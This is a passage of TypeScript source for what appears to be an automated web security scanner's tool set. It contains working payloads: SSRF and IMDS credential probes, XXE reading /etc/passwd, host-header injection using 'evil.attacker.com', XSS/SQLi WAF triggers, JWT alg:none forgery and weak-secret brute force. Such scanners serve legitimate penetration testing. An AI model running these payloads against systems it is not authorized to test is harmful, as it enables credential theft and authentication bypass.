            subdomains.add(cleaned);
          }
        }
      }

      const sorted = Array.from(subdomains).sort();

      return {
        success: true,
        output: [
          `Certificate Transparency Results for ${domain}`,
          `Unique subdomains from CT logs: ${sorted.length}`,
          sorted.join('\n') || '(none found)',
        ].join('\n'),
        findings: sorted.length > 0 ? [{
          title: `CT Logs: ${sorted.length} Subdomains Discovered`,
          severity: 'info' as const,
          details: `Certificate Transparency logs reveal ${sorted.length} unique subdomains for ${domain}`,
          provenance: 'tool' as const,
          toolName: 'cert_transparency',
          toolOutput: sorted.join('\n'),
        }] : undefined,
      };
    },
  },
  {
    name: 'subdomain_takeover',
    description: 'Check subdomains for dangling CNAMEs pointing to claimable services',
    category: 'vuln',
    parameters: [
      { name: 'domain', type: 'string', description: 'Root domain or comma-separated list of subdomains to check', required: true },
    ],
    handler: async (context) => {
      const input = String(context.parameters.domain).trim();

      const fingerprints: Array<{ service: string; cnameSuffix: string; bodyString: string }> = [
        { service: 'GitHub Pages', cnameSuffix: 'github.io', bodyString: "There isn't a GitHub Pages site here" },
        { service: 'AWS S3', cnameSuffix: 's3.amazonaws.com', bodyString: 'NoSuchBucket' },
        { service: 'Heroku', cnameSuffix: 'herokudns.com', bodyString: 'No such app' },
        { service: 'Netlify', cnameSuffix: 'netlify.com', bodyString: 'Not Found - Request ID' },
        { service: 'Fastly', cnameSuffix: 'fastly.net', bodyString: 'Fastly error: unknown domain' },
        { service: 'Azure Web App', cnameSuffix: 'azurewebsites.net', bodyString: '404 Web Site not found' },
        { service: 'Shopify', cnameSuffix: 'myshopify.com', bodyString: 'Sorry, this shop is currently unavailable' },
        { service: 'WordPress.com', cnameSuffix: 'wordpress.com', bodyString: 'Do you want to register' },
      ];

      let subdomains: string[];
      if (input.includes(',')) {
        subdomains = input.split(',').map(s => s.trim()).filter(Boolean);
      } else {
        // Single domain — enumerate common prefixes
        const prefixes = ['www', 'api', 'mail', 'dev', 'staging', 'test', 'admin', 'shop', 'blog', 'cdn', 'static', 'assets', 'media', 'app', 'portal'];
        const resolvedSubs: string[] = [];
        await Promise.all(prefixes.map(async p => {
          const sub = `${p}.${input}`;
          try {
            await dnsResolve4(sub);
            resolvedSubs.push(sub);
          } catch { /* not found */ }
        }));
        subdomains = resolvedSubs;
      }

      const findings: NonNullable<ToolResult['findings']> = [];
      const results: string[] = [];

      for (const sub of subdomains) {
        let cnames: string[] = [];
        try {
          cnames = await dnsResolveCname(sub).catch(() => []);
        } catch { cnames = []; }

        if (cnames.length === 0) continue;

        const cname = cnames[0].toLowerCase();
        const match = fingerprints.find(f => cname.includes(f.cnameSuffix));
        if (!match) {
          results.push(`${sub} → CNAME: ${cname} (no known fingerprint)`);
          continue;
        }

        // Check if the service is unclaimed
        let bodyText = '';
        try {
          const resp = await fetch(`https://${sub}`, {
            signal: AbortSignal.timeout(6000),
            headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)' },
          });
          bodyText = await resp.text();
        } catch {
          try {
            const resp2 = await fetch(`http://${sub}`, {
              signal: AbortSignal.timeout(6000),
              headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)' },
            });
            bodyText = await resp2.text();
          } catch { bodyText = ''; }
        }

        if (bodyText.includes(match.bodyString)) {
          results.push(`TAKEOVER POSSIBLE: ${sub} → CNAME ${cname} (${match.service}) — fingerprint confirmed`);
          findings.push({
            title: `Subdomain Takeover: ${sub} (${match.service})`,
            severity: 'high' as const,
            details: `${sub} has CNAME pointing to ${cname} (${match.service}) but the resource is unclaimed. Fingerprint: "${match.bodyString}" found in response.`,
            provenance: 'tool' as const,
            toolName: 'subdomain_takeover',
            toolOutput: `CNAME: ${cname}, fingerprint confirmed`,
          });
        } else {
          results.push(`${sub} → CNAME: ${cname} (${match.service}) — claimed or not responding with fingerprint`);
        }
      }

      return {
        success: true,
        output: [
          `Subdomain Takeover Check for ${input}`,
          `Subdomains checked: ${subdomains.length}`,
          results.length > 0 ? results.join('\n') : 'No subdomains with CNAMEs found.',
          findings.length > 0 ? `\nPOSSIBLE TAKEOVERS: ${findings.length}` : '',
        ].join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'ssrf_test',
    description: 'Test URL parameters and common headers for SSRF vulnerabilities',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Target URL to test for SSRF', required: true },
    ],
    handler: async (context) => {
      const targetUrl = String(context.parameters.url).trim();

      let baseUrl: URL;
      try { baseUrl = new URL(targetUrl); } catch { return { success: false, error: `Invalid URL: ${targetUrl}` }; }

      const ssrfPayloads = [
        'http://169.254.169.254/latest/meta-data/',
        'http://127.0.0.1/',
        'http://[::1]/',
      ];
      const metadataMarkers = ['ami-id', 'instance-id', 'local-ipv4', 'computemetadata', 'aws_secret', 'iam/security', 'hostname'];
      const commonSsrfParams = ['url', 'uri', 'src', 'dest', 'redirect', 'next', 'image', 'link', 'href', 'callback', 'webhook', 'proxy'];

      const findings: NonNullable<ToolResult['findings']> = [];
      const results: string[] = [];

      // Determine params to test
      const urlParams = Array.from(baseUrl.searchParams.keys());
      const paramsToTest = urlParams.length > 0 ? urlParams : commonSsrfParams;

      // Get baseline
      let baselineStatus = 0;
      try {
        const b = await fetch(targetUrl, { signal: AbortSignal.timeout(5000) });
        baselineStatus = b.status;
      } catch { /* ignore */ }

      // Test each param × payload
      for (const param of paramsToTest.slice(0, 11)) {
        for (const payload of ssrfPayloads) {
          const testUrl = new URL(targetUrl);
          testUrl.searchParams.set(param, payload);
          try {
            const resp = await fetch(testUrl.href, { signal: AbortSignal.timeout(5000) });
            const body = await resp.text();
            const bodyLower = body.toLowerCase();
            if (metadataMarkers.some(m => bodyLower.includes(m))) {
              results.push(`SSRF CRITICAL: param=${param} payload=${payload} — metadata markers in response`);
              findings.push({
                title: `SSRF via parameter "${param}"`,
                severity: 'critical' as const,
                details: `Cloud metadata accessible via SSRF. Parameter "${param}" fetched ${payload} and returned metadata markers.`,
                provenance: 'tool' as const,
                toolName: 'ssrf_test',
                toolOutput: body.slice(0, 300),
              });
            }
          } catch (e: unknown) {
            const msg = (e as Error).message ?? '';
            if (msg.includes('timeout') || msg.includes('timed out')) {
              results.push(`TIMEOUT (possible SSRF indicator): param=${param} payload=${payload}`);
            }
          }
        }
      }

      // Test SSRF via headers
      const ssrfHeaders: Array<{ name: string; value: string }> = [
        { name: 'X-Forwarded-For', value: '169.254.169.254' },
        { name: 'X-Forwarded-Host', value: '169.254.169.254' },
      ];

      for (const hdr of ssrfHeaders) {
        try {
          const resp = await fetch(targetUrl, {
            signal: AbortSignal.timeout(5000),
            headers: { [hdr.name]: hdr.value },
          });
          const body = await resp.text();
          if (metadataMarkers.some(m => body.toLowerCase().includes(m))) {
            results.push(`SSRF via header ${hdr.name}: ${hdr.value} — metadata in response`);
            findings.push({
              title: `SSRF via header injection (${hdr.name})`,
              severity: 'critical' as const,
              details: `Cloud metadata accessible via ${hdr.name}: ${hdr.value} header injection.`,
              provenance: 'tool' as const,
              toolName: 'ssrf_test',
              toolOutput: body.slice(0, 300),
            });
          }
        } catch { /* skip */ }
      }

      return {
        success: true,
        output: [
          `SSRF Test Results for ${targetUrl}`,
          `Baseline status: ${baselineStatus}`,
          `Params tested: ${paramsToTest.slice(0, 11).join(', ')}`,
          `Headers tested: ${ssrfHeaders.map(h => h.name).join(', ')}`,
          results.length > 0 ? results.join('\n') : 'No SSRF indicators found.',
        ].join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'cloud_storage_check',
    description: 'Check for publicly accessible S3/GCS/Azure Blob storage buckets',
    category: 'vuln',
    parameters: [
      { name: 'domain', type: 'string', description: 'Target domain to derive bucket name candidates from', required: true },
    ],
    handler: async (context) => {
      const domain = String(context.parameters.domain).trim().toLowerCase();
      const baseName = domain.split('.')[0];
      const dashDomain = domain.replace(/\./g, '-');

      const bucketCandidates = [
        baseName,
        `${baseName}-assets`,
        `${baseName}-static`,
        `${baseName}-media`,
        `${baseName}-uploads`,
        `${baseName}-files`,
        `${baseName}-backup`,
        `${baseName}-prod`,
        `${baseName}-staging`,
        `${baseName}-www`,
        dashDomain,
      ];

      const findings: NonNullable<ToolResult['findings']> = [];
      const results: string[] = [];

      for (const bucket of bucketCandidates) {
        // AWS S3 — path-style and virtual-hosted
        const s3Urls = [
          `https://${bucket}.s3.amazonaws.com/`,
          `https://s3.amazonaws.com/${bucket}/`,
        ];
        for (const s3Url of s3Urls) {
          try {
            const resp = await fetch(s3Url, { signal: AbortSignal.timeout(6000) });
            const body = await resp.text();
            if (resp.status === 200 && body.includes('ListBucketResult')) {
              results.push(`PUBLIC S3 BUCKET: ${s3Url}`);
              findings.push({
                title: `Public S3 Bucket: ${bucket}`,
                severity: 'high' as const,
                details: `S3 bucket "${bucket}" is publicly listable at ${s3Url}`,
                provenance: 'tool' as const,
                toolName: 'cloud_storage_check',
                toolOutput: body.slice(0, 300),
              });
            } else if (body.includes('NoSuchBucket')) {
              results.push(`S3 not found: ${bucket}`);
            } else if (body.includes('AccessDenied')) {
              results.push(`S3 exists (private): ${bucket}`);
            }
          } catch { /* skip */ }
        }

        // GCS
        try {
          const gcsUrl = `https://storage.googleapis.com/${bucket}/`;
          const resp = await fetch(gcsUrl, { signal: AbortSignal.timeout(6000) });
          const body = await resp.text();
          if (resp.status === 200 && (body.includes('ListBucketResult') || body.includes('<Contents>'))) {
            results.push(`PUBLIC GCS BUCKET: ${gcsUrl}`);
            findings.push({
              title: `Public GCS Bucket: ${bucket}`,
              severity: 'high' as const,
              details: `Google Cloud Storage bucket "${bucket}" is publicly listable.`,
              provenance: 'tool' as const,
              toolName: 'cloud_storage_check',
              toolOutput: body.slice(0, 300),
            });
          }
        } catch { /* skip */ }

        // Azure Blob Storage
        try {
          const azureUrl = `https://${baseName}.blob.core.windows.net/${bucket}?restype=container&comp=list`;
          const resp = await fetch(azureUrl, { signal: AbortSignal.timeout(6000) });
          const body = await resp.text();
          if (resp.status === 200 && body.includes('<EnumerationResults')) {
            results.push(`PUBLIC AZURE CONTAINER: ${azureUrl}`);
            findings.push({
              title: `Public Azure Blob Container: ${bucket}`,
              severity: 'high' as const,
              details: `Azure Blob container "${bucket}" is publicly listable.`,
              provenance: 'tool' as const,
              toolName: 'cloud_storage_check',
              toolOutput: body.slice(0, 300),
            });
          }
        } catch { /* skip */ }
      }

      return {
        success: true,
        output: [
          `Cloud Storage Check for ${domain}`,
          `Bucket candidates tested: ${bucketCandidates.length}`,
          results.length > 0 ? results.join('\n') : 'No public cloud storage buckets found.',
        ].join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'host_header_injection',
    description: 'Test Host/X-Forwarded-Host header injection for cache poisoning and password reset hijacking',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Target URL to test', required: true },
    ],
    handler: async (context) => {
      const targetUrl = String(context.parameters.url).trim();
      const evilHost = 'evil.attacker.com';

      const testHeaders: Array<{ headerName: string; value: string }> = [
        { headerName: 'Host', value: evilHost },
        { headerName: 'X-Forwarded-Host', value: evilHost },
        { headerName: 'X-Host', value: evilHost },
        { headerName: 'X-Original-URL', value: `http://${evilHost}/` },
        { headerName: 'X-Rewrite-URL', value: `http://${evilHost}/` },
      ];

      const findings: NonNullable<ToolResult['findings']> = [];
      const results: string[] = [];

      for (const t of testHeaders) {
        try {
          const resp = await fetch(targetUrl, {
            signal: AbortSignal.timeout(8000),
            headers: {
              'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
              [t.headerName]: t.value,
            },
            redirect: 'manual',
          });
          const body = await resp.text();
          const location = resp.headers.get('location') ?? '';

          const reflected = body.includes(evilHost) || location.includes(evilHost);
          if (reflected) {
            results.push(`REFLECTED: ${t.headerName}: ${t.value} → found in body or Location header`);
            findings.push({
              title: `Host Header Injection via ${t.headerName}`,
              severity: 'high' as const,
              details: `"${evilHost}" reflected in response when injected via ${t.headerName} header. Potential cache poisoning or password reset hijacking.`,
              provenance: 'tool' as const,
              toolName: 'host_header_injection',
              toolOutput: location ? `Location: ${location}` : body.slice(0, 300),
            });
          } else {
            results.push(`Not reflected: ${t.headerName}: ${t.value} (status: ${resp.status})`);
          }
        } catch { results.push(`Error testing ${t.headerName}`); }
      }

      return {
        success: true,
        output: [
          `Host Header Injection Test for ${targetUrl}`,
          results.join('\n'),
          findings.length > 0 ? `\nCONFIRMED FINDINGS: ${findings.length}` : 'No host header injection detected.',
        ].join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'xxe_test',
    description: 'Test XML/SVG upload endpoints for XXE injection',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Base URL to probe for XML/SVG upload endpoints', required: true },
    ],
    handler: async (context) => {
      const baseUrl = String(context.parameters.url).trim().replace(/\/$/, '');

      const xmlPayload = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`;
      const svgPayload = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`;

      const paths = ['/upload', '/api/upload', '/import', '/api/import', '/parse', '/xml', '/api/xml', ''];
      const findings: NonNullable<ToolResult['findings']> = [];
      const results: string[] = [];

      const detectMarkers = ['root:x:0:0', '[extensions]', 'root:*:0:0'];

      for (const path of paths) {
        const endpoint = `${baseUrl}${path}`;

        // XML
        try {
          const resp = await fetch(endpoint, {
            method: 'POST',
            signal: AbortSignal.timeout(8000),
            headers: { 'Content-Type': 'application/xml', 'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)' },
            body: xmlPayload,
          });
          const body = await resp.text();
          if (detectMarkers.some(m => body.includes(m))) {
            results.push(`XXE CONFIRMED (XML) at ${endpoint}`);
            findings.push({
              title: `XXE Injection at ${endpoint} (XML)`,
              severity: 'critical' as const,
              details: `XXE confirmed: /etc/passwd content found in response from POST application/xml to ${endpoint}`,
              provenance: 'tool' as const,
              toolName: 'xxe_test',
              toolOutput: body.slice(0, 300),
            });
          } else {
            results.push(`XML tested at ${endpoint}: no XXE markers (status ${resp.status})`);
          }
        } catch { /* skip */ }

        // SVG
        try {
          const resp = await fetch(endpoint, {
            method: 'POST',
            signal: AbortSignal.timeout(8000),
            headers: { 'Content-Type': 'image/svg+xml', 'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)' },
            body: svgPayload,
          });
          const body = await resp.text();
          if (detectMarkers.some(m => body.includes(m))) {
            results.push(`XXE CONFIRMED (SVG) at ${endpoint}`);
            findings.push({
              title: `XXE Injection at ${endpoint} (SVG)`,
              severity: 'critical' as const,
              details: `XXE confirmed via SVG upload: /etc/passwd content in response from ${endpoint}`,
              provenance: 'tool' as const,
              toolName: 'xxe_test',
              toolOutput: body.slice(0, 300),
            });
          }
        } catch { /* skip */ }
      }

      return {
        success: true,
        output: [
          `XXE Test Results for ${baseUrl}`,
          `Paths tested: ${paths.map(p => p || '/').join(', ')}`,
          results.join('\n') || 'No XXE vulnerabilities detected.',
        ].join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'graphql_probe',
    description: 'Discover and test GraphQL endpoints for introspection and batch query issues',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Base URL to probe for GraphQL endpoints', required: true },
    ],
    handler: async (context) => {
      const baseUrl = String(context.parameters.url).trim().replace(/\/$/, '');

      const probePaths = ['/graphql', '/api/graphql', '/graphql/v1', '/v1/graphql', '/graphiql', '/query', '/gql'];
      const introspectionQuery = '{"query":"{__schema{queryType{name}}}"}';
      const fullIntrospection = '{"query":"{ __schema { types { name } } }"}';
      const batchQuery = '[{"query":"{__typename}"},{"query":"{__typename}"}]';

      const findings: NonNullable<ToolResult['findings']> = [];
      const results: string[] = [];
      let foundEndpoint = '';

      // Discovery
      for (const path of probePaths) {
        const endpoint = `${baseUrl}${path}`;
        try {
          const resp = await fetch(endpoint, {
            method: 'POST',
            signal: AbortSignal.timeout(6000),
            headers: { 'Content-Type': 'application/json' },
            body: introspectionQuery,
          });
          const body = await resp.text();
          if (body.includes('__schema') || body.includes('queryType')) {
            foundEndpoint = endpoint;
            results.push(`GraphQL endpoint found: ${endpoint}`);
            break;
          }
        } catch { /* skip */ }
      }

      if (!foundEndpoint) {
        return {
          success: true,
          output: `GraphQL Probe for ${baseUrl}\nNo GraphQL endpoints found at standard paths.`,
        };
      }

      // Full introspection
      try {
        const resp = await fetch(foundEndpoint, {
          method: 'POST',
          signal: AbortSignal.timeout(8000),
          headers: { 'Content-Type': 'application/json' },
          body: fullIntrospection,
        });
        const body = await resp.text();
        if (body.includes('"types"')) {
          let typeNames: string[] = [];
          try {
            const parsed = JSON.parse(body) as { data?: { __schema?: { types?: Array<{ name: string }> } } };
            typeNames = (parsed.data?.__schema?.types ?? [])
              .map((t) => t.name)
              .filter(n => !n.startsWith('__'));
          } catch { /* parse failed */ }
          results.push(`Introspection enabled — types: ${typeNames.slice(0, 20).join(', ')}`);
          findings.push({
            title: 'GraphQL Introspection Enabled',
            severity: 'medium' as const,
            details: `GraphQL introspection is publicly enabled at ${foundEndpoint}. Exposed types: ${typeNames.slice(0, 10).join(', ')}`,
            provenance: 'tool' as const,
            toolName: 'graphql_probe',
            toolOutput: body.slice(0, 500),
          });
        }
      } catch { /* skip */ }

      // Batch query
      try {
        const resp = await fetch(foundEndpoint, {
          method: 'POST',
          signal: AbortSignal.timeout(6000),
          headers: { 'Content-Type': 'application/json' },
          body: batchQuery,
        });
        const body = await resp.text();
        if (resp.ok && body.startsWith('[')) {
          results.push('Batch queries accepted');
          findings.push({
            title: 'GraphQL Batch Queries Enabled',
            severity: 'medium' as const,
            details: `${foundEndpoint} accepts batch GraphQL queries, which can be used for rate-limit bypass and brute-force amplification.`,
            provenance: 'tool' as const,
            toolName: 'graphql_probe',
            toolOutput: body.slice(0, 300),
          });
        }
      } catch { /* skip */ }

      return {
        success: true,
        output: [
          `GraphQL Probe Results for ${baseUrl}`,
          results.join('\n'),
        ].join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'waf_detect',
    description: 'Fingerprint WAF presence by response headers, cookies, and block page signatures',
    category: 'recon',
    parameters: [
      { name: 'url', type: 'string', description: 'Target URL to fingerprint for WAF', required: true },
    ],
    handler: async (context) => {
      const targetUrl = String(context.parameters.url).trim();

      const headerFingerprints: Array<{ header: string; waf: string }> = [
        { header: 'cf-ray', waf: 'Cloudflare' },
        { header: 'x-sucuri-id', waf: 'Sucuri' },
        { header: 'x-iinfo', waf: 'Incapsula' },
        { header: 'x-akamai-session-id', waf: 'Akamai' },
        { header: 'x-azure-ref', waf: 'Azure Front Door' },
        { header: 'x-amzn-requestid', waf: 'AWS WAF' },
      ];

      const cookieFingerprints: Array<{ pattern: RegExp; waf: string }> = [
        { pattern: /__cfduid|_cf_bm|cf_clearance/, waf: 'Cloudflare' },
        { pattern: /visid_incap|incap_ses/, waf: 'Incapsula' },
        { pattern: /BIGipServer/, waf: 'F5 BIG-IP' },
      ];

      const blockPageSignatures: Array<{ text: string; waf: string }> = [
        { text: 'Attention Required! | Cloudflare', waf: 'Cloudflare' },
        { text: 'Request unsuccessful. Incapsula incident', waf: 'Incapsula' },
        { text: 'Access Denied - Sucuri Website Firewall', waf: 'Sucuri' },
        { text: 'ModSecurity Action', waf: 'ModSecurity' },
        { text: 'The requested URL was rejected', waf: 'Generic WAF' },
      ];

      const detectedWafs = new Set<string>();

      // Normal request
      try {
        const resp = await fetch(targetUrl, {
          signal: AbortSignal.timeout(8000),
          headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)' },
        });

        // Check response headers
        for (const fp of headerFingerprints) {
          if (resp.headers.get(fp.header)) detectedWafs.add(fp.waf);
        }

        // Check cookies
        const setCookie = resp.headers.get('set-cookie') ?? '';
        for (const fp of cookieFingerprints) {
          if (fp.pattern.test(setCookie)) detectedWafs.add(fp.waf);
        }
      } catch { /* skip */ }

      // Malicious payload request to trigger WAF block
      try {
        const malUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}q=<script>alert(1)</script>&id=1%27+OR+%271%27%3D%271`;
        const resp = await fetch(malUrl, {
          signal: AbortSignal.timeout(8000),
          headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)' },
        });
        const body = await resp.text();

        // Check headers again
        for (const fp of headerFingerprints) {
          if (resp.headers.get(fp.header)) detectedWafs.add(fp.waf);
        }

        // Check block page signatures
        for (const sig of blockPageSignatures) {
          if (body.includes(sig.text)) detectedWafs.add(sig.waf);
        }
      } catch { /* skip */ }

      const wafList = Array.from(detectedWafs);

      return {
        success: true,
        output: [
          `WAF Detection Results for ${targetUrl}`,
          wafList.length > 0 ? `Detected WAF(s): ${wafList.join(', ')}` : 'None detected',
        ].join('\n'),
        findings: wafList.length > 0 ? [{
          title: `WAF Detected: ${wafList.join(', ')}`,
          severity: 'info' as const,
          details: `WAF fingerprinted: ${wafList.join(', ')}. Adjust payload encoding and evasion techniques accordingly.`,
          provenance: 'tool' as const,
          toolName: 'waf_detect',
          toolOutput: wafList.join(', '),
        }] : undefined,
      };
    },
  },
  {
    name: 'cloud_metadata',
    description: 'Probe cloud IMDS endpoints from the scanner host to detect cloud environment exposure',
    category: 'recon',
    parameters: [],
    handler: async (_context) => {
      const probes: Array<{ name: string; url: string; headers?: Record<string, string> }> = [
        { name: 'AWS IMDSv1 meta-data', url: 'http://169.254.169.254/latest/meta-data/' },
        { name: 'AWS IMDSv1 credentials', url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
        { name: 'GCP metadata', url: 'http://metadata.google.internal/computeMetadata/v1/?recursive=true', headers: { 'Metadata-Flavor': 'Google' } },
        { name: 'Azure IMDS', url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', headers: { 'Metadata': 'true' } },
      ];

      const findings: NonNullable<ToolResult['findings']> = [];
      const results: string[] = [];

      for (const probe of probes) {
        try {
          const resp = await fetch(probe.url, {
            signal: AbortSignal.timeout(3000),
            headers: {
              'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
              ...(probe.headers ?? {}),
            },
          });
          const body = await resp.text();
          if (resp.status === 200 && body.trim().length > 0) {
            results.push(`ACCESSIBLE: ${probe.name} (${probe.url})\nFirst 200 chars: ${body.slice(0, 200)}`);
            findings.push({
              title: `Cloud IMDS Accessible: ${probe.name}`,
              severity: 'critical' as const,
              details: `Cloud instance metadata service is accessible. ${probe.name} at ${probe.url} returned HTTP 200 with content. This confirms the scanner is running inside the cloud environment and IMDS is not protected by IMDSv2 or network policy.`,
              provenance: 'tool' as const,
              toolName: 'cloud_metadata',
              toolOutput: body.slice(0, 200),
            });
          } else {
            results.push(`Not accessible: ${probe.name} (HTTP ${resp.status})`);
          }
        } catch {
          results.push(`Timeout/Error: ${probe.name} — likely not in cloud or IMDSv2 enforced`);
        }
      }

      const note = findings.length === 0
        ? 'No IMDS endpoints accessible — IMDSv2 enforced, not a cloud environment, or network policy blocks 169.254.169.254.'
        : `WARNING: ${findings.length} IMDS endpoint(s) accessible from scanner host.`;

      return {
        success: true,
        output: [`Cloud Metadata (IMDS) Probe Results`, note, results.join('\n')].join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'jwt_manipulate',
    description: 'Attack JWT tokens with alg:none bypass and weak secret brute-force',
    category: 'vuln',
    parameters: [
      { name: 'token', type: 'string', description: 'JWT token to analyze and attack', required: true },
      { name: 'url', type: 'string', description: 'Optional endpoint to test manipulated tokens against', required: false },
      { name: 'header', type: 'string', description: 'HTTP header to send token in', required: false, default: 'Authorization' },
    ],
    handler: async (context) => {
      const token = String(context.parameters.token).trim();
      const testUrl = context.parameters.url ? String(context.parameters.url).trim() : '';
      const authHeader = String(context.parameters.header ?? 'Authorization');

      const parts = token.split('.');
      if (parts.length !== 3) return { success: false, error: 'Invalid JWT format — expected 3 dot-separated parts' };

      const base64urlDecode = (s: string): string => {
        const padded = s.replace(/-/g, '+').replace(/_/g, '/').padEnd(s.length + (4 - s.length % 4) % 4, '=');
        return Buffer.from(padded, 'base64').toString('utf8');
      };
      const base64urlEncode = (s: string): string =>
        Buffer.from(s).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');

      let header: Record<string, unknown>;
      let payload: Record<string, unknown>;
      try {
        header = JSON.parse(base64urlDecode(parts[0])) as Record<string, unknown>;
        payload = JSON.parse(base64urlDecode(parts[1])) as Record<string, unknown>;
      } catch {
        return { success: false, error: 'Failed to decode JWT parts' };
      }

      const findings: NonNullable<ToolResult['findings']> = [];
      const results: string[] = [];

      results.push(`Header: ${JSON.stringify(header)}`);
      results.push(`Payload: ${JSON.stringify(payload)}`);

      const alg = String(header.alg ?? '');

      // Generate alg:none token
      const noneHeader = { ...header, alg: 'none' };
      const noneToken = `${base64urlEncode(JSON.stringify(noneHeader))}.${parts[1]}.`;
      results.push(`alg:none token: ${noneToken.slice(0, 80)}...`);

      // Test alg:none token against URL if provided
      if (testUrl) {
        try {
          const resp = await fetch(testUrl, {
            signal: AbortSignal.timeout(8000),
            headers: {
              [authHeader]: `Bearer ${noneToken}`,
              'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
            },
          });
          if (resp.status === 200 || resp.status === 201) {
            results.push(`ALG:NONE ACCEPTED at ${testUrl} (HTTP ${resp.status})`);
            findings.push({
              title: 'JWT alg:none Attack Successful',
              severity: 'critical' as const,
              details: `Server accepted a JWT with alg:none (no signature) at ${testUrl}. Authentication can be bypassed by forging arbitrary payloads.`,
              provenance: 'tool' as const,
              toolName: 'jwt_manipulate',
              toolOutput: `HTTP ${resp.status} with alg:none token`,
            });
          } else {
            results.push(`alg:none rejected at ${testUrl} (HTTP ${resp.status})`);
          }
        } catch { results.push(`alg:none test error at ${testUrl}`); }
      }

      // Brute-force weak HMAC secret
      if (alg.startsWith('HS')) {
        const algMap: Record<string, string> = { HS256: 'sha256', HS384: 'sha384', HS512: 'sha512' };
        const hashAlg = algMap[alg] ?? 'sha256';
        const weakSecrets = ['secret', 'password', '123456', 'test', 'key', 'admin', 'jwt_secret', 'supersecret', 'changeme', '', 'your-secret-key'];
        const signingInput = `${parts[0]}.${parts[1]}`;
        const expectedSig = parts[2];

        for (const secret of weakSecrets) {
          const computed = createHmac(hashAlg, secret)
            .update(signingInput)
            .digest('base64')
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
          if (computed === expectedSig) {
            results.push(`WEAK SECRET FOUND: "${secret}"`);
            findings.push({
              title: `JWT Weak Secret: "${secret}"`,
              severity: 'critical' as const,
              details: `JWT is signed with the weak secret "${secret}" using ${alg}. An attacker can forge arbitrary tokens with any payload.`,
              provenance: 'tool' as const,
              toolName: 'jwt_manipulate',
              toolOutput: `Secret: "${secret}", alg: ${alg}`,
            });
            break;
          }
        }
        if (findings.length === 0) results.push('No weak secret found from wordlist');
      }

      return {
        success: true,
        output: [
          `JWT Manipulation Results`,
          `Algorithm: ${alg}`,
          results.join('\n'),
        ].join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'oauth_probe',
    description: 'Discover OAuth endpoints and test redirect_uri validation',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'Base URL to probe for OAuth/OIDC endpoints', required: true },
    ],
    handler: async (context) => {
      const baseUrl = String(context.parameters.url).trim().replace(/\/$/, '');

      const findings: NonNullable<ToolResult['findings']> = [];
      const results: string[] = [];

      // OIDC/OAuth discovery
      let authEndpoint = '';
      const discoveryPaths = ['/.well-known/openid-configuration', '/.well-known/oauth-authorization-server'];
      for (const path of discoveryPaths) {
        try {
          const resp = await fetch(`${baseUrl}${path}`, { signal: AbortSignal.timeout(6000) });
          if (resp.ok) {
            const body = await resp.text();
            let doc: Record<string, unknown> = {};
            try { doc = JSON.parse(body) as Record<string, unknown>; } catch { /* skip */ }
            if (doc.authorization_endpoint) {
              authEndpoint = String(doc.authorization_endpoint);
              results.push(`OIDC discovery found at ${path}`);
              results.push(`auth_endpoint: ${authEndpoint}`);
              results.push(`token_endpoint: ${String(doc.token_endpoint ?? '')}`);
              results.push(`userinfo_endpoint: ${String(doc.userinfo_endpoint ?? '')}`);
              findings.push({
                title: 'OIDC Configuration Exposed',
                severity: 'info' as const,
                details: `OpenID Connect discovery endpoint exposed at ${baseUrl}${path}`,
                provenance: 'tool' as const,
                toolName: 'oauth_probe',
                toolOutput: body.slice(0, 300),
              });
              break;
            }
          }
        } catch { /* skip */ }
      }

      // Manual auth endpoint discovery — follow redirects so we see the real response,
      // not a CDN's HTTP→HTTPS passthrough. A 301 alone does NOT confirm the path exists.
      if (!authEndpoint) {
        const authPaths = ['/oauth/authorize', '/oauth2/authorize', '/auth/authorize'];
        for (const p of authPaths) {
          try {
            const resp = await fetch(`${baseUrl}${p}`, {
              signal: AbortSignal.timeout(5000),
              redirect: 'follow', // follow redirects to see the real server response
            });
            // Only accept 200, 400, 401, or other non-404 non-redirected responses
            if (resp.status !== 404 && resp.status !== 301 && resp.status !== 302) {
              authEndpoint = `${baseUrl}${p}`;
              results.push(`Auth endpoint found: ${authEndpoint} (HTTP ${resp.status})`);
              break;
            }
          } catch { /* skip */ }
        }
      }

      if (!authEndpoint) {
        return {
          success: true,
          output: `OAuth Probe for ${baseUrl}\nNo OAuth/OIDC endpoints found.`,
          findings: undefined,
        };
      }

